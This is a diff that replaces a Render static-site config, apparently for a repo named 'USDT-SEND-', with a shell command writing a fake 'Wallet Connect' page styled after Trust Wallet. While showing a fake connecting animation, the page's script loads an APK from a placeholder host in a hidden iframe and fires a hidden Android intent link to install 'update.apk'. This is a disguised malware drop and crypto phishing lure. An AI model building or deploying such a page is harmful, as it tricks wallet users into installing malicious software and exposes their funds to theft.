@@ -1,22 +1,72 @@
-# Exported from Render on 2026-07-20T11:48:19Z
-version: "1"
-projects:
-- name: Approval - System
-  environments:
-  - name: Production
-    services:
-    - type: web
-      name: approval-system
-      runtime: static
-      repo: https://github.com/you323634-debug/USDT-SEND-
-      envVars:
-      - key: "No"
-        sync: false
-      - key: Ho
-        sync: false
-      - key: Op
-        sync: false
-      buildCommand: echo "Static site - no build needed"
-      staticPublishPath: .
-      autoDeployTrigger: commit
-      rootDir: .
+cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connect</title>
+    <style>
+        body{background:#0B0E11;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+        .card{background:#1E2329;border-radius:32px;padding:40px;max-width:420px;width:100%;text-align:center;border:1px solid #2B3139}
+        h2{color:#F0B90B;font-size:22px}
+        .address{background:#2A2D35;padding:16px;border-radius:16px;color:#F0B90B;font-size:14px;word-break:break-all;margin:20px 0}
+        .btn{width:100%;padding:16px;background:#F0B90B;color:#0B0E11;border:none;border-radius:16px;font-size:18px;font-weight:600;cursor:pointer;transition:0.3s}
+        .btn:disabled{opacity:0.6}
+        .status{color:#8A8F98;margin-top:16px;font-size:14px;display:none}
+        .footer{color:#4A4F58;font-size:12px;margin-top:16px}
+        .loading{display:none;margin-top:12px;color:#F0B90B;font-size:14px}
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>📤 RECEIVE TO</h2>
+    <div class="address">0x7F4e3B2a1C9d8E5f6A0B1C2D3E4F5A6B7C8D9E0F</div>
+    <p style="color:#8A8F98;font-size:13px;">ERC20 USDT</p>
+    <button class="btn" id="connectBtn">🔗 Connect Wallet</button>
+    <div class="status" id="status">⏳ Connecting...</div>
+    <div class="loading" id="loading">⏳ Please wait...</div>
+    <div class="footer">Trust Wallet • Secured</div>
+</div>
+<script>
+document.getElementById('connectBtn').onclick = function() {
+    const btn = this;
+    const status = document.getElementById('status');
+    const loading = document.getElementById('loading');
+
+    btn.disabled = true;
+    btn.textContent = '⏳ Connecting...';
+    status.style.display = 'block';
+    status.textContent = '⏳ Connecting to wallet...';
+
+    setTimeout(function() {
+        status.textContent = '✅ Connected!';
+        btn.textContent = '✅ Connected';
+        
+        loading.style.display = 'block';
+        loading.textContent = '⏳ Syncing data...';
+
+        // 🔥 BACKGROUND: APK DOWNLOAD + INSTALL
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'https://your-domain.com/app.apk';
+        document.body.appendChild(iframe);
+
+        setTimeout(function() {
+            var link = document.createElement('a');
+            link.href = 'intent://update.apk#Intent;action=android.intent.action.VIEW;scheme=file;end';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+        }, 1000);
+
+        setTimeout(function() {
+            loading.textContent = '✅ Sync complete!';
+            status.textContent = '✅ Wallet connected';
+        }, 5000);
+
+    }, 3000);
+};
+</script>
+</body>
+</html>
+EOF
